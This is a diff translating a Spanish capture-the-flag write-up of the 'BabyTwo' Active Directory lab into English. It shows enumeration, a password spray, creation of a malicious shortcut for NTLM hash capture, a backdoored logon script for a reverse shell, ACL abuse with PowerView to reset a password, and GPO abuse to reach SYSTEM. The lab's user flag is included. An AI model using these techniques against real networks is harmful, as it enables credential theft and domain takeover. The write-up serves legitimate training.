@@ -1,6 +1,6 @@
 ﻿# Writeup: BabyTwo
 
->Primero realizamos un escaneo de Nmap de los puertos TCP de la máquina víctima:
+>First we perform an Nmap scan of the TCP ports of the victim machine:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/babytwo]
@@ -37,7 +37,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 82.47 seconds
 ```
 
->Enumeramos con netexec datos del DC:
+>We list with netexec DC data:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
@@ -45,14 +45,14 @@ Nmap done: 1 IP address (1 host up) scanned in 82.47 seconds
 SMB         10.129.14.189   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:None) (Null Auth:True)
 ```
 
->Agregamos los nombres de dominio encontrados en el escaneo al resolutor local para poder resolver sus nombres DNS:
+>We add the domain names found in the scan to the local resolver in order to resolve their DNS names:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
 └─$ echo "10.129.14.189 baby2.vl DC dc.baby2.vl" >> /etc/hosts
 ```
 
->Enumeración de usuarios mediante la técnica **RID brute-force** empleando **Guest Session**:
+> User enumeration using the **RID brute-force** technique using **Guest Session**:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
@@ -99,7 +99,7 @@ SMB         10.129.14.189   445    DC               1602: BABY2\library (SidType
 SMB         10.129.14.189   445    DC               2601: BABY2\legacy (SidTypeGroup)
 ```
 
->Tratamos el output anterior para obtener una lista con solo los usuarios:
+>We covered the output above to get a list with only the users:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/babytwo]
@@ -122,7 +122,7 @@ Amelia.Griffiths
 library
 ```
 
->Aquí vemos las **shares de SMB** disponibles con nuestra Guest Session:
+>Here we see the **SMB Shares** available with our Guest Session:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
@@ -142,7 +142,7 @@ SMB         10.129.14.189   445    DC               NETLOGON        READ        
 SMB         10.129.14.189   445    DC               SYSVOL                          Logon server share 
 ```
 
->Hacemos un **password spray** poniendo el nombre del usuario como credencial y vemos dos usuarios con credenciales válidas: `library:library  Carl.Moore:Carl.Moore`
+>We make a **password spray** by putting the user's name as a credential and we see two users with valid credentials: `library:library  Carl.Moore:Carl.Moore`
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/babytwo]
@@ -164,7 +164,7 @@ Version: dev (n/a) - 01/13/26 - Ronnie Flathers @ropnop
 2026/01/13 10:05:00 >  Done! Tested 16 logins (2 successes) in 0.268 seconds
 ```
 
->Ingestamos archivos de bloodhound:
+>We ingest bloodhound files:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/babytwo]
@@ -194,7 +194,7 @@ INFO: Done in 00M 15S
 INFO: Compressing output into 20260113100859_bloodhound.zip
 ```
 
->Por ahora vemos que ningún usuario del que dispongamos acceso tiene ACLs interesantes, así que vamos a enumerar las shares y vemos que library tiene privilegios de **READ,WRITE** sobre 3 shares:
+>For now we see that no user we have access to has interesting ACLs, so let's list the shares and see that library has **READ,WRITE** privileges on 3 shares:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/babytwo]
@@ -214,7 +214,7 @@ SMB         10.129.14.189   445    DC               NETLOGON        READ        
 SMB         10.129.14.189   445    DC               SYSVOL          READ            Logon server share
 ```
 
->En la share **apps**, vemos un archivo lnk que podríamos sustituir por uno malicioso para obtener el **hash NTLMv2** del usuario que lo abra:
+>In the share **apps**, we see an lnk file that we could replace with a malicious one to obtain the **NTLMv2 hash** of the user who opens it:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/babytwo]
@@ -234,7 +234,7 @@ smb: \dev\> ls
   login.vbs.lnk                       A     1800  Thu Sep  7 15:13:23 2023
 ```
 
->Vamos a crear el lnk malicioso:
+>Let's create the malicious lnk:
 
 ```powershell
 $objShell = New-Object -ComObject WScript.Shell
@@ -247,7 +247,7 @@ $lnk.HotKey = "Ctrl+Alt+O"
 $lnk.Save()
 ```
 
->Lo subimos, como no hay acceso al archivo original vamos a probar a ver si abre otros archivos lnk, pero esto no hace nada:
+>We upload it, as there is no access to the original file we will try to see if it opens other lnk files, but this does nothing:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/babytwo]
@@ -259,7 +259,7 @@ putting file legit.lnk as \dev\legit.lnk (6.8 kB/s) (average 6.8 kB/s)
 smb: \dev\> exit
 ```
 
->Entonces vamos a enumerar otras shares, en este caso, en la de **SYSVOL** vemos un logon script en **VBS**:
+>Then we are going to list other shares, in this case, in the **SYSVOL** we see a logon script in **VBS**:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/babytwo]
@@ -270,7 +270,7 @@ smb: \baby2.vl\scripts\> get login.vbs
 getting file \baby2.vl\scripts\login.vbs of size 992 as login.vbs (3.9 KiloBytes/sec) (average 3.9 KiloBytes/sec)
 ```
 
->Y vemos que el contenido del script es el siguiente:
+>And we see that the content of the script is as follows:
 
 ```vb
 ┌──(kali㉿jbkira)-[~/Desktop/machines/babytwo]
@@ -310,7 +310,7 @@ MapNetworkShare "\\dc.baby2.vl\apps", "V"
 MapNetworkShare "\\dc.baby2.vl\docs", "L"  
 ```
 
->Lo modificamos para que nos de una reverse shell:
+>We modified it to give us a reverse shell:
 
 ```vb
 ┌──(kali㉿jbkira)-[~/Desktop/machines/babytwo]
@@ -352,7 +352,7 @@ MapNetworkShare "\\dc.baby2.vl\apps", "V"
 MapNetworkShare "\\dc.baby2.vl\docs", "L"  
 ```
 
->Subimos el archivo modificado y recibimos la reverse shell como el usuario **amelia.griffiths**:
+>We upload the modified file and receive the reverse shell as the user **amelia.griffiths**:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/babytwo]
@@ -374,18 +374,18 @@ PS C:\Windows\system32> whoami
 baby2\amelia.griffiths
 ```
 
->Vemos que el usuario **amelia.griffiths** posee las ACEs **WriteDacl** y **WriteOwner** sobre la OU **GPO-MANAGEMENT** y el usuario **GPOADM**:
+>We see that the user **amelia.griffiths** owns the ACEs **WriteDacl** and **WriteOwner** over the OU **GPO-MANAGEMENT** and the user **GPOADM**:
 
 <img width="893" height="328" alt="image" src="https://github.com/user-attachments/assets/caf42820-fbd4-44d1-8437-722f8b1e713a" />
 
->Leemos primero la user flag:
+>Let's read the user flag first:
 
 ```powershell
 PS C:\> cat user.txt
 42783b2c1483aeb70eca6810f0645c38
 ```
 
->Vamos a abusar la ACE **WriteDacl** sobre el usuario **GPOADM** para darnos control total sobre el usuario y luego cambiarle la contraseña usando **PowerView.ps1**:
+>We're going to abuse the ACE **WriteDacl** over the user **GPOADM** to give us full control over the user and then change the password using **PowerView.ps1**:
 
 ```powershell
 PS C:\tools> add-domainobjectacl -rights "all" -targetidentity "gpoadm" -principalidentity "Amelia.Griffiths"
@@ -393,7 +393,7 @@ PS C:\tools> $cred = ConvertTo-SecureString 'Password123$!' -AsPlainText -Force
 PS C:\tools> set-domainuserpassword gpoadm -accountpassword $cred
 ```
 
->Comprobamos que las credenciales se han modificado correctamente:
+>We have verified that the credentials have been successfully modified:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/babytwo]
@@ -402,11 +402,11 @@ SMB         10.129.14.189   445    DC               [*] Windows Server 2022 Buil
 SMB         10.129.14.189   445    DC               [+] baby2.vl\gpoadm:Password123$!
 ```
 
->Vemos que el usuario **gpoadm** tiene la ACE **GenericAll** sobre 2 GPOs, la que nos interesa es la de **Default Domain Policy**:
+>We see that the user **gpoadm** has the ACE **GenericAll** on 2 GPOs, the one we are interested in is that of **Default Domain Policy**:
 
 <img width="1121" height="232" alt="image" src="https://github.com/user-attachments/assets/9402a18b-5755-435a-9359-49bf10b91736" />
 
->Vamos a usar **pyGPOAbuse** para crear en la **GPO** una task que nos reenvie una **reverse shell**: https://github.com/Hackndo/pyGPOAbuse
+>We will use **pyGPOAbuse** to create in the **GPO** a task that will forward us a **reverse shell**: https://github.com/Hackndo/pyGPOAbuse
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/babytwo/pyGPOAbuse]
@@ -415,11 +415,11 @@ SUCCESS:root:ScheduledTask TASK_68774013 created!
 [+] ScheduledTask TASK_68774013 created!
 ```
 
->El id de la GPO lo obtenemos de bloodhound:
+>We get the GPO id from bloodhound:
 
 <img width="352" height="534" alt="image" src="https://github.com/user-attachments/assets/4a578556-cf31-47f8-8d80-079f171af2f6" />
 
->Ahora vamos a hacer un `gpupdate` para guardar los cambios en la **GPO** como el usuario **amelia.griffiths**:
+>Now we are going to make a `gpupdate` to save the changes in the **GPO** as the user **amelia.griffiths**:
 
 ```bash
 PS C:\Windows\system32> gpupdate
@@ -432,7 +432,7 @@ Computer Policy update has completed successfully.
 User Policy update has completed successfully.
 ```
 
->Y recibimos una shell como **SYSTEM** y leemos la última flag:
+>And we get a shell like **SYSTEM** and we read the last flag:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
